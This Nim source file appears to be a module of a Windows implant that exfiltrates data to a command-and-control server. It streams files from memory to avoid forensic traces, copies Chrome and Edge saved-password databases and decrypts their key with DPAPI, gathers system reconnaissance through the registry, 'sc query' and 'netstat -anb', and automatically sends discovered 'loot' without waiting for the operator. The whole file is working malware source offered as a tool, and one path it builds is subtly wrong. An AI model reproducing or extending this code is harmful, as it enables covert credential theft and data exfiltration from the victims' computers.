# hardened/exfil_stream.nim — Streaming exfiltration and browser credential decryption
#
# Enhances the existing exfiltration with:
#   1. Stream-to-C2 without writing to disk — file contents are read
#      into memory, encrypted, and chunked directly to the C2 channel.
#      This reduces forensic footprint (no staging dir on disk).
#   2. Browser credential decryption on the fly: read Chrome/Edge Login
#      Data, decrypt using the Local State AES key + DPAPI, exfiltrate
#      as structured JSON instead of the whole DB.
#   3. Expanded system information gathering: installed software,
#      running services, network connections via WMI and APIs.
#   4. Automatic exfiltration trigger: when auto-drive finds new loot,
#      immediately stream the file content without waiting for operator.
#
# All streaming uses the existing AES-256-GCM session encryption and
# the file_chunk protocol, so the server side is unchanged.

when not defined(windows):
  {.error: "exfil_stream.nim is Windows-only".}

import winim/lean
import winim/inc/[windef, winbase]
import std/[strutils, json, times, base64, locks, os, asyncdispatch, osproc]
import ./syscalls
import ./fileio_syscall

type
  StreamExfil* = ref object
    sendToC2*: proc(msg: JsonNode): Future[void] {.gcsafe.}
    chunkSize*: int
    autoStream*: bool  # auto-stream new loot

# ---- Streaming file upload (no disk staging) ------------------------------

proc streamFileToC2*(exfil: StreamExfil; filepath: string;
                     remoteName: string = ""): Future[void] {.async.} =
  # Stream a file directly to C2 without writing to disk.
  # Reads the file in memory, chunks it, and sends via file_chunk.
  if not fsFileExists(filepath): return

  let actualName = if remoteName.len > 0: remoteName else: filepath.extractFilename
  let fileSize = fsGetFileSize(filepath)
  if fileSize <= 0: return

  let totalChunks = (int(fileSize) + exfil.chunkSize - 1) div exfil.chunkSize
  var idx = 0
  var offset = 0

  try:
    let data = fsReadFileMem(filepath)
    while offset < data.len:
      let n = min(exfil.chunkSize, data.len - offset)
      let chunk = data[offset..<offset + n]
      let isLast = (offset + n >= data.len)

      await exfil.sendToC2(%* {
        "type": "file_chunk",
        "filepath": actualName,
        "chunk_index": idx,
        "total_chunks": totalChunks,
        "data": base64.encode(chunk),
        "last_chunk": isLast
      })

      inc idx
      offset += n
  except:
    try:
      await exfil.sendToC2(%* {
        "type": "output",
        "data": "[!] stream exfil failed: " & getCurrentExceptionMsg()
      })
    except:
      discard

# ---- Browser credential decryption ----------------------------------------
#
# Chrome/Edge store credentials in an SQLite DB ("Login Data") encrypted
# with AES-256-GCM. The encryption key is stored in "Local State" as a
# DPAPI-encrypted blob. To decrypt:
#   1. Read Local State JSON, extract "os_crypt.encrypted_key"
#   2. Decode base64, strip DPAPI prefix "DPAPI", call CryptUnprotectData
#   3. Use the decrypted key to decrypt Login Data values (AES-GCM)
#   4. Each Login Data entry has: origin_url, username_value, password_value
#      The password_value is: version(3 bytes) "v10" || nonce(12) || ciphertext || tag(16)

type
  BrowserCredential* = object
    originUrl*: string
    username*: string
    password*: string
    browser*: string
    profile*: string

proc decryptChromeKey*(localStatePath: string): seq[byte] =
  # Extract and decrypt the Chrome/Edge AES key from Local State.
  try:
    let raw = fsReadFileStr(localStatePath)
    if raw.len == 0: return @[]

    let j = parseJson(raw)
    if not j.hasKey("os_crypt"): return @[]
    let osCrypt = j["os_crypt"]
    if not osCrypt.hasKey("encrypted_key"): return @[]

    let encKeyB64 = osCrypt["encrypted_key"].getStr()
    let encKey = base64.decode(encKeyB64)
    if encKey.len < 5: return @[]

    # Strip DPAPI prefix "DPAPI" (5 bytes)
    if encKey.len < 5:
      return @[]
    let dpapiKey = encKey[5..<encKey.len]

    # CryptUnprotectData to decrypt
    var dataIn: DATA_BLOB
    var dataOut: DATA_BLOB
    dataIn.cbData = DWORD(dpapiKey.len)
    dataIn.pbData = cast[ptr BYTE](unsafeAddr dpapiKey[0])

    if CryptUnprotectData(addr dataIn, nil, nil, nil, nil,
                          CRYPTPROTECT_LOCAL_MACHINE, addr dataOut) != 0:
      result = newSeq[byte](int(dataOut.cbData))
      copyMem(addr result[0], dataOut.pbData, int(dataOut.cbData))
      LocalFree(cast[HLOCAL](dataOut.pbData))
  except:
    return @[]


proc exfilBrowserCredentialsStream*(exfil: StreamExfil;
                                     localApp: string;
                                     brand: string;
                                     profile: string): Future[JsonNode] {.async.} =
  # Stream browser credential database directly to C2 (no on-device decryption).
  # The operator decrypts on the server side using the Local State key.
  let base = localApp / brand / "User Data" / profile
  let loginDataPath = base / "Login Data"
  let localStatePath = base / "User Data" / "Local State"

  if not fsFileExists(loginDataPath):
    result = %* {"type": "exfil", "kind": "browser_creds",
                 "browser": brand, "profile": profile,
                 "count": 0, "error": "Login Data not found"}
    return

  # Stream the Login Data DB directly
  await streamFileToC2(exfil, loginDataPath, brand & "_" & profile & "_Login Data.db")

  # Also stream the Local State (contains the encrypted AES key)
  if fsFileExists(localStatePath):
    await streamFileToC2(exfil, localStatePath, brand & "_" & profile & "_Local State")

  result = %* {"type": "exfil", "kind": "browser_creds",
               "browser": brand, "profile": profile,
               "count": 2,
               "note": "Server-side decryption required (use Local State key + DPAPI)"}

# ---- Expanded system information ------------------------------------------

proc gatherSystemInfoExpanded*(): JsonNode =
  # Gather detailed system info: installed software, services, network connections.
  result = %* {"type": "recon", "kind": "system_info_expanded"}

  # 1. Installed software from registry
  try:
    var sw: seq[JsonNode] = @[]
    let uninstallKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
    var hKey: HKEY
    let wKey = newWideCString(uninstallKey)
    if RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                     cast[LPCWSTR](wKey[0].addr),
                     0, KEY_READ, addr hKey) == ERROR_SUCCESS:
      var index: DWORD = 0
      var name: array[256, WCHAR]
      var nameLen: DWORD = 256
      while RegEnumKeyExW(hKey, index, cast[LPWSTR](addr name[0]),
                          addr nameLen, nil, nil, nil, nil) == ERROR_SUCCESS:
        var subKey: HKEY
        if RegOpenKeyExW(hKey, cast[LPWSTR](addr name[0]), 0,
                         KEY_READ, addr subKey) == ERROR_SUCCESS:
          var displayName: array[256, WCHAR]
          var dispLen: DWORD = sizeof(displayName).DWORD
          var dataType: DWORD = 0
          if RegQueryValueExW(subKey, cast[LPCWSTR](newWideCString("DisplayName")[0].addr),
                              nil, addr dataType,
                              cast[ptr BYTE](addr displayName[0]),
                              addr dispLen) == ERROR_SUCCESS:
            let dn = $cast[WideCString](addr displayName[0])
            if dn.len > 0:
              sw.add(%* {"name": dn})
          discard RegCloseKey(subKey)
        inc index
        nameLen = 256
      discard RegCloseKey(hKey)
      result["installed_software"] = %sw
  except:
    result["installed_software_error"] = %getCurrentExceptionMsg()

  # 2. Running services
  try:
    let (svcOutput, _) = execCmdEx("sc query state= all",
                                    options = {poStdErrToStdOut})
    var services: seq[JsonNode] = @[]
    var currentSvc: string = ""
    for line in svcOutput.splitLines():
      if line.startsWith("SERVICE_NAME:"):
        currentSvc = line[13..^1].strip()
      elif line.startsWith("DISPLAY_NAME:") and currentSvc.len > 0:
        let dn = line[13..^1].strip()
        services.add(%* {"name": currentSvc, "display": dn})
        currentSvc = ""
    result["services"] = %services
  except:
    result["services_error"] = %getCurrentExceptionMsg()

  # 3. Active network connections
  try:
    let (netstatOutput, _) = execCmdEx("netstat -anb",
                                       options = {poStdErrToStdOut})
    var connections: seq[JsonNode] = @[]
    for line in netstatOutput.splitLines():
      let trimmed = line.strip()
      if trimmed.startsWith("TCP") or trimmed.startsWith("UDP"):
        let parts = trimmed.splitWhitespace()
        if parts.len >= 3:
          connections.add(%* {
            "proto": parts[0],
            "local": parts[1],
            "remote": parts[2],
            "state": (if parts.len >= 4: parts[3] else: "")
          })
    result["connections"] = %connections
  except:
    result["connections_error"] = %getCurrentExceptionMsg()

# ---- Auto-triggered streaming exfiltration -------------------------------

proc autoStreamLoot*(exfil: StreamExfil; lootPath: string;
                      lootKind: string): Future[void] {.async.} =
  # Automatically stream a loot file to C2 when discovered.
  # This reduces dwell time — we don't wait for the operator to
  # issue a download command.
  if not exfil.autoStream: return
  if not fsFileExists(lootPath): return

  let fileSize = fsGetFileSize(lootPath)
  # Only auto-stream small files (< 5 MB) to avoid saturating the C2
  if fileSize > 5 * 1024 * 1024: return

  # Emit a loot event first
  await exfil.sendToC2(%* {
    "type": "loot",
    "kind": lootKind,
    "path": lootPath,
    "size": int(fileSize),
    "autoStream": true
  })

  # Stream the file
  let filename = lootKind & "_" & lootPath.extractFilename
  await streamFileToC2(exfil, lootPath, filename)

# ---- Export public API ----------------------------------------------------

export StreamExfil, BrowserCredential
export streamFileToC2, exfilBrowserCredentialsStream
export gatherSystemInfoExpanded, autoStreamLoot
export decryptChromeKey
